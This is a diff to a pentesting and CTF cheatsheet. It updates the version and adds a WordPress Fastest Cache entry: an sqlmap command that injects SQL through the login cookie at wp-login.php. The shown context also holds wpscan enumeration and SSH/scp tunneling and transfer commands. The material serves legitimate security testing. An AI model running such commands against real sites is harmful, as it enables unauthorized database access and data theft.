@@ -3,7 +3,7 @@
  /_ | _[ | _[ |  / /    || _><__  ||   | _\ | /  | |__|  ]_
    \||___/|___/ /_/     |/ |/\_/  |/   |/   |/   |___/|___/
 
-Version 0.9
+Version 1.0
 Changes are welcome!
 GitHub: https://github.com/Leetcore/1337-observer
 This file is my cheatsheet for pentesting and CTFs.
@@ -13,7 +13,8 @@ If you read with `less` type `-i` (ignore case) before searching.
 Type `/nc` to search.
 
 🔥 HOT HOT HOT
-In this file: log4shell (java), printnightmare (windows), pwnkit (linux).
+In this file: wordpress fastest cache (php), log4shell (java), printnightmare (windows), 
+pwnkit (linux).
 
 # IP setup
 host=127.0.0.1
@@ -386,13 +387,18 @@ filter?category=Gifts' || 'Pets
 enumerate plugins, themes etc
 wpscan --url http://domain -e vp,dbe,cb
 
+# wordpress wp fastest cache (wp, plugin)
+sqlmap --dbms=mysql -u "http://domain.com/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 --banner --batch
+
 # SSH (port forwarding)
 ssh -L 3389:10.200.115.35:3389 -i id.key root@holo.live
 
 # SCP (scp, ssh, copy, file):
 scp /path/of/your/local/filename username@hostname:/path/to/remote/server/folder
+
 # upload (-l maxspeed)
 scp -l 1000000 file.zip root@127.0.0.1:/tmp
+
 # download (-l maxspeed)
 scp -l 1000000 root@127.0.0.1:/tmp .
 
